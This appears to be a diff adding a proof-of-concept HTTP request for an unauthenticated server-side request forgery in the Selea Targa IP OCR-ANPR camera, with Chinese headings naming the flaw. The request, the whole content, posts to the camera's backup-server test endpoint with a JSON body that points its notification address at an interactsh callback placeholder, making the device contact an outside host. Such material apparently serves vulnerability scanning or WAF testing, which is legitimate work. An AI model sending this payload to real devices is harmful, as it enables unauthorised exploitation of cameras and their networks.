@@ -1,0 +1,11 @@
+# Selea Targa IP OCR-ANPR Camera 服务器请求伪造漏洞
+# Selea Targa IP OCR-ANPR摄像机-未经认证的SSRF
+POST /cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE&acid=80001700&bid=hd_tag_m8mv25fp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25fp
+RM-PRO-Token: 14f071c2be02110930367bba6659ac1c
+RM-PRO-Time: 1742808465779
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{"test_type":"ip","test_debug":false,"ipnotify_type":"http/get","ipnotify_address":"http://{{interactsh-url}}","ipnotify_username":"","ipnotify_password":"","ipnotify_port":"0","ipnotify_content_type":"","ipnotify_template":""}
